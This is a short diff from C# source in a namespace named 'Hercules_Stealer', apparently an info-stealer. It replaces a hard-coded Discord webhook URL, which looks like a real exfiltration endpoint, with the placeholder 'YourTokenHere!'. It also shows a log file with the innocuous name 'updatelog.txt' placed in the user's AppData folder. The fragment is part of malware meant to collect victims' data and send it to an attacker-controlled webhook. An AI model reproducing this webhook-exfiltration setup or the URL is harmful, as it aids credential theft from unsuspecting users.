@@ -35,7 +35,7 @@ namespace Hercules_Stealer
 
 	public class Stealer
 	{
-		public static string Hook = "https://discordapp.com/api/webhooks/873155239501520917/5bpbG7db4jPztlMVpt6dfa_nxb4RTFv21DMqCQWepB-S5I4hWTUlCAXdCYV8m_evjAdm";
+		public static string Hook = "YourTokenHere!";
 
 		private static string _path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\updatelog.txt";
 
